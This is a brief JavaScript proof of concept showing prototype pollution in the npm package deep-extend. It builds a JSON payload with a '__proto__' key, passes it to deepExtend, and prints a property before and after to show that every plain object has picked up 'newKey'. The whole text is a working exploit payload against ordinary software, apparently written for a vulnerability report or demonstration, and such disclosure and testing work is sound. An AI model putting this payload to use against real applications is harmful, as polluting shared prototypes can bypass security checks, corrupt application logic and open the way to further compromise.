var deepExtend = require('deep-extend');
var malPayload = '{"__proto__": {"newKey": "newValue"}}';

var obj = {};
console.log('newKey: ' + obj.newKey);
deepExtend({}, JSON.parse(malPayload));
console.log('newKey: ' + obj.newKey);
